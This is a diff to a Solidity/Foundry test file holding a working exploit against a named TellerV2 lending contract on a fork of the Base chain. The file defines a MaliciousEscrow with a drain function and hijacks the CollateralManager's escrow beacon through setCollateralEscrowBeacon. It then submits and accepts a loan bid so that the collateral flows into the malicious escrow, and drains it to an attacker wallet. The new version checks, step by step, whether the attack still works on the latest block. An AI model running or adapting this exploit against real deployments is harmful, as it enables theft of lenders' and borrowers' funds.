@@ -14,10 +14,10 @@ struct Collateral {
 }
 
 interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
     function transfer(address, uint256) external returns (bool);
     function transferFrom(address, address, uint256) external returns (bool);
     function approve(address, uint256) external returns (bool);
-    function balanceOf(address) external view returns (uint256);
 }
 
 interface ICollateralManager {
@@ -36,6 +36,7 @@ interface IMarketRegistry {
     function getPaymentType(uint256) external view returns (uint8);
     function getMarketplaceFee(uint256) external view returns (uint16);
     function getMarketFeeRecipient(uint256) external view returns (address);
+    function getMarketOwner(uint256) external view returns (address);
 }
 
 interface IProtocolPausingManager {
@@ -46,6 +47,12 @@ interface ITellerV2 {
     function collateralManager() external view returns (address);
     function marketRegistry() external view returns (address);
     function getProtocolPausingManager() external view returns (address);
+    function protocolFee() external view returns (uint16);
+    function getProtocolFeeRecipient() external view returns (address);
+    function bidId() external view returns (uint256);
+    function getBidState(uint256) external view returns (uint8);
+    function getLoanBorrower(uint256) external view returns (address);
+    function isLoanExpired(uint256) external view returns (bool);
     function submitBid(
         address _lendingToken,
         uint256 _marketplaceId,
@@ -64,14 +71,11 @@ interface IBeacon {
 }
 
 contract UpgradeableBeacon is IBeacon {
-    address private _implementation;
+    address private _impl;
     address private _owner;
-    constructor(address impl_, address owner_) { _implementation = impl_; _owner = owner_; }
-    function implementation() external view returns (address) { return _implementation; }
-    function upgradeTo(address newImpl) external {
-        require(msg.sender == _owner, "not owner");
-        _implementation = newImpl;
-    }
+    constructor(address impl_, address owner_) { _impl = impl_; _owner = owner_; }
+    function implementation() external view returns (address) { return _impl; }
+    function upgradeTo(address n) external { require(msg.sender == _owner, "no"); _impl = n; }
 }
 
 contract MockERC20 {
@@ -81,34 +85,24 @@ contract MockERC20 {
     uint256 public totalSupply;
     mapping(address => uint256) public balanceOf;
     mapping(address => mapping(address => uint256)) public allowance;
-
-    constructor(string memory n, string memory s, uint8 d) {
-        name = n; symbol = s; decimals = d;
+    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }
+    function mint(address to, uint256 a) external { balanceOf[to] += a; totalSupply += a; }
+    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
+    function transfer(address to, uint256 a) external returns (bool) { return _x(msg.sender, to, a); }
+    function transferFrom(address f, address t, uint256 a) external returns (bool) {
+        require(allowance[f][msg.sender] >= a, "allow");
+        allowance[f][msg.sender] -= a;
+        return _x(f, t, a);
     }
-    function mint(address to, uint256 amount) external {
-        balanceOf[to] += amount;
-        totalSupply += amount;
-    }
-    function approve(address spender, uint256 amount) external returns (bool) {
-        allowance[msg.sender][spender] = amount;
-        return true;
-    }
-    function transfer(address to, uint256 amount) external returns (bool) {
-        return _transfer(msg.sender, to, amount);
-    }
-    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
-        require(allowance[from][msg.sender] >= amount, "allowance");
-        allowance[from][msg.sender] -= amount;
-        return _transfer(from, to, amount);
-    }
-    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
-        require(balanceOf[from] >= amount, "balance");
-        balanceOf[from] -= amount;
-        balanceOf[to] += amount;
+    function _x(address f, address t, uint256 a) internal returns (bool) {
+        require(balanceOf[f] >= a, "bal");
+        balanceOf[f] -= a;
+        balanceOf[t] += a;
         return true;
     }
 }
 
+/// @dev Matches the real `ICollateralEscrowV1.depositAsset(CollateralType,address,uint256,uint256)` selector.
 contract MaliciousEscrow {
     function initialize(uint256) external {}
     function depositAsset(
@@ -120,8 +114,8 @@ contract MaliciousEscrow {
         IERC20(_collateralAddress).transferFrom(msg.sender, address(this), _amount);
     }
     function drain(address _token) external {
-        uint256 bal = IERC20(_token).balanceOf(address(this));
-        if (bal > 0) IERC20(_token).transfer(msg.sender, bal);
+        uint256 b = IERC20(_token).balanceOf(address(this));
+        if (b > 0) IERC20(_token).transfer(msg.sender, b);
     }
 }
 
@@ -129,182 +123,146 @@ contract BeaconHijackTest is Test {
     address constant TELLER_V2 = 0x5cfD3aeD08a444Be32839bD911Ebecd688861164;
     uint256 constant MARKET_ID = 1;
 
-    // Block that the previous successful PoC ran against; reinitializer(2) is still fresh here.
-    uint256 constant HISTORICAL_BLOCK = 54_726_906;
-
     address borrower;
     address lender;
     address attackerWallet;
 
-    MockERC20 collateralToken;
-    MockERC20 lendingToken;
+    MockERC20 col;
+    MockERC20 usd;
 
-    /* --------------------------------------------------------------- */
-    /* PoC — fork the historical block and run the full exploit       */
-    /* --------------------------------------------------------------- */
-
-    function test_PoC_OnVulnerableBlock() public {
-        vm.createSelectFork(vm.envString("BASE_FORK_URL"), HISTORICAL_BLOCK);
-        console.log("=== PoC fork block:", block.number, "===");
-
-        _runExploit(true);
-    }
-
-    /* --------------------------------------------------------------- */
-    /* Monitoring — fork latest and report status, never fails        */
-    /* --------------------------------------------------------------- */
-
-    function test_Status_OnLatestBlock() public {
+    function setUp() public {
         vm.createSelectFork(vm.envString("BASE_FORK_URL"));
-        console.log("=== Latest fork block:", block.number, "===");
+        console.log("=== Fork block:", block.number, "===");
 
-        _runExploit(false);
-    }
-
-    /* --------------------------------------------------------------- */
-
-    function _runExploit(bool mustSucceed) internal {
         borrower = makeAddr("attackerBorrower");
         lender = makeAddr("attackerLender");
         attackerWallet = makeAddr("attackerWallet");
 
-        collateralToken = new MockERC20("Fake Collateral", "FC", 18);
-        lendingToken = new MockERC20("Fake USD", "FUSD", 6);
-        collateralToken.mint(borrower, 1_000 ether);
-        lendingToken.mint(lender, 1_000_000e6);
+        col = new MockERC20("Fake Collateral", "FC", 18);
+        usd = new MockERC20("Fake USD", "FUSD", 6);
+        col.mint(borrower, 1_000 ether);
+        usd.mint(lender, 1_000_000e6);
+    }
 
+    function test_Diagnose_StepByStep() public {
         ITellerV2 teller = ITellerV2(TELLER_V2);
         ICollateralManager cm = ICollateralManager(teller.collateralManager());
         address registry = teller.marketRegistry();
-        address pausingManager = teller.getProtocolPausingManager();
+        address pausing = teller.getProtocolPausingManager();
 
-        console.log("TellerV2:         ", TELLER_V2);
-        console.log("CollateralManager:", address(cm));
-        console.log("PausingManager:   ", pausingManager);
+        console.log("TellerV2:        ", TELLER_V2);
+        console.log("CollateralMgr:   ", address(cm));
+        console.log("Registry:        ", registry);
+        console.log("PausingManager:  ", pausing);
+        console.log("protocolFee:     ", teller.protocolFee());
+        console.log("feeRecipient:    ", teller.getProtocolFeeRecipient());
+        console.log("bidId():         ", teller.bidId());
 
-        _mockMarketRegistry(registry);
-        if (pausingManager != address(0)) {
+        // -------- 0. Verify live pausing state before mocking --------
+        if (pausing != address(0)) {
+            try IProtocolPausingManager(pausing).protocolPaused() returns (bool p) {
+                console.log("live protocolPaused():", p);
+            } catch (bytes memory r) {
+                console.log("live protocolPaused() reverted:");
+                console.logBytes(r);
+            }
+        } else {
+            console.log("!! getProtocolPausingManager() returned address(0)");
+        }
+
+        // -------- 1. Mock registry + pausing --------
+        _mockRegistry(registry);
+        if (pausing != address(0)) {
             vm.mockCall(
-                pausingManager,
+                pausing,
                 abi.encodeWithSelector(IProtocolPausingManager.protocolPaused.selector),
                 abi.encode(false)
             );
         }
 
-        // 1. Attempt beacon hijack.
+        // -------- 2. Hijack beacon --------
         MaliciousEscrow impl = new MaliciousEscrow();
         UpgradeableBeacon beacon = new UpgradeableBeacon(address(impl), address(this));
-
-        bool hijacked;
-        bytes memory revertReason;
         try cm.setCollateralEscrowBeacon(address(beacon)) {
-            hijacked = true;
-        } catch (bytes memory reason) {
-            revertReason = reason;
-        }
-
-        if (!hijacked) {
-            console.log("==================================================");
-            console.log("BEACON HIJACK REVERTED - vulnerability is CLOSED.");
-            console.log("Revert reason:");
-            console.logBytes(revertReason);
-            console.log("");
-            console.log("This means one of:");
-            console.log("  1. Protocol deployed a patched CollateralManager impl.");
-            console.log("  2. Another party already consumed reinitializer(2).");
-            console.log("==================================================");
-            if (mustSucceed) {
-                fail("PoC expected historical block to be vulnerable");
-            }
+            console.log("STEP 2 SUCCESS: beacon hijacked ->", address(beacon));
+        } catch (bytes memory r) {
+            console.log("STEP 2 FAILED: setCollateralEscrowBeacon reverted");
+            console.logBytes(r);
             return;
         }
 
-        console.log("Beacon hijacked -> malicious escrow impl:", address(impl));
-        console.log("Beacon proxy:                          ", address(beacon));
-
-        // 2. Borrower submits bid with fake collateral.
+        // -------- 3. submitBid --------
         Collateral[] memory collats = new Collateral[](1);
         collats[0] = Collateral({
             _collateralType: CollateralType.ERC20,
             _amount: 500 ether,
             _tokenId: 0,
-            _collateralAddress: address(collateralToken)
+            _collateralAddress: address(col)
         });
 
+        uint256 bidId;
         vm.startPrank(borrower);
-        collateralToken.approve(address(cm), 500 ether);
-        uint256 bidId = teller.submitBid(
-            address(lendingToken),
-            MARKET_ID,
-            1_000e6,
-            30 days,
-            1_000,
-            "",
-            borrower,
-            collats
-        );
+        col.approve(address(cm), 500 ether);
+        try teller.submitBid(
+            address(usd), MARKET_ID, 1_000e6, 30 days, 1_000, "", borrower, collats
+        ) returns (uint256 id) {
+            bidId = id;
+            console.log("STEP 3 SUCCESS: bidId =", id);
+        } catch (bytes memory r) {
+            console.log("STEP 3 FAILED: submitBid reverted");
+            console.logBytes(r);
+            vm.stopPrank();
+            return;
+        }
         vm.stopPrank();
-        console.log("Bid submitted, bidId =", bidId);
 
-        // 3. Lender accepts. deployAndDeposit runs, collateral flows into the malicious escrow.
+        // State after submitBid
+        console.log("bid state (1=PENDING):", teller.getBidState(bidId));
+        console.log("bid borrower:         ", teller.getLoanBorrower(bidId));
+        console.log("isLoanExpired:        ", teller.isLoanExpired(bidId));
+
+        // -------- 4. lenderAcceptBid --------
         vm.startPrank(lender);
-        lendingToken.approve(TELLER_V2, 1_000_000e6);
-        teller.lenderAcceptBid(bidId);
+        usd.approve(TELLER_V2, 1_000_000e6);
+        try teller.lenderAcceptBid(bidId) returns (uint256 toP, uint256 toM, uint256 toB) {
+            console.log("STEP 4 SUCCESS: lenderAcceptBid");
+            console.log("  amountToProtocol:   ", toP);
+            console.log("  amountToMarketplace:", toM);
+            console.log("  amountToBorrower:   ", toB);
+        } catch (bytes memory r) {
+            console.log("STEP 4 FAILED: lenderAcceptBid reverted");
+            console.logBytes(r);
+            vm.stopPrank();
+            return;
+        }
         vm.stopPrank();
-        console.log("Lender accepted bid.");
 
+        // -------- 5. Verify escrow --------
         address escrow = cm.getEscrow(bidId);
-        console.log("Escrow deployed at:", escrow);
-        require(escrow != address(0), "no escrow deployed");
-        require(collateralToken.balanceOf(escrow) == 500 ether, "escrow balance mismatch");
+        console.log("escrow address:", escrow);
+        if (escrow == address(0)) {
+            console.log("STEP 5 FAILED: no escrow deployed");
+            return;
+        }
+        console.log("escrow collateral balance:", col.balanceOf(escrow));
 
-        // 4. Drain the escrow to the attacker's wallet.
+        // -------- 6. Drain --------
         vm.prank(attackerWallet);
-        MaliciousEscrow(escrow).drain(address(collateralToken));
-
-        uint256 stolen = collateralToken.balanceOf(attackerWallet);
-        console.log("Attacker wallet balance:", stolen);
-
-        assertEq(stolen, 500 ether, "attacker did not receive collateral");
-        assertEq(collateralToken.balanceOf(escrow), 0, "escrow not emptied");
-
-        console.log("");
-        console.log("=== EXPLOIT CONFIRMED ===");
-        console.log("500e18 collateral drained into attacker wallet.");
+        MaliciousEscrow(escrow).drain(address(col));
+        console.log("attacker wallet balance:  ", col.balanceOf(attackerWallet));
+        console.log("escrow balance after drain:", col.balanceOf(escrow));
     }
 
-    /* -------------------------- mocks -------------------------- */
-
-    function _mockMarketRegistry(address registry) internal {
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.isVerifiedBorrower.selector, MARKET_ID, borrower),
-            abi.encode(true, ""));
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.isVerifiedLender.selector, MARKET_ID, lender),
-            abi.encode(true, ""));
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.isMarketOpen.selector, MARKET_ID),
-            abi.encode(true));
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.isMarketClosed.selector, MARKET_ID),
-            abi.encode(false));
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.getPaymentCycle.selector, MARKET_ID),
-            abi.encode(uint32(30 days), uint8(0)));
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.getPaymentDefaultDuration.selector, MARKET_ID),
-            abi.encode(uint32(3 days)));
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.getBidExpirationTime.selector, MARKET_ID),
-            abi.encode(uint32(0)));
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.getPaymentType.selector, MARKET_ID),
-            abi.encode(uint8(1))); // Bullet
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.getMarketplaceFee.selector, MARKET_ID),
-            abi.encode(uint16(100)));
-        vm.mockCall(registry,
-            abi.encodeWithSelector(IMarketRegistry.getMarketFeeRecipient.selector, MARKET_ID),
-            abi.encode(address(0xFEE)));
+    function _mockRegistry(address registry) internal {
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.isVerifiedBorrower.selector, MARKET_ID, borrower), abi.encode(true, ""));
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.isVerifiedLender.selector, MARKET_ID, lender), abi.encode(true, ""));
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.isMarketOpen.selector, MARKET_ID), abi.encode(true));
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.isMarketClosed.selector, MARKET_ID), abi.encode(false));
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getPaymentCycle.selector, MARKET_ID), abi.encode(uint32(30 days), uint8(0)));
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getPaymentDefaultDuration.selector, MARKET_ID), abi.encode(uint32(3 days)));
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getBidExpirationTime.selector, MARKET_ID), abi.encode(uint32(0)));
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getPaymentType.selector, MARKET_ID), abi.encode(uint8(1))); // Bullet
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getMarketplaceFee.selector, MARKET_ID), abi.encode(uint16(100)));
+        vm.mockCall(registry, abi.encodeWithSelector(IMarketRegistry.getMarketFeeRecipient.selector, MARKET_ID), abi.encode(address(0xFEE)));
     }
 }
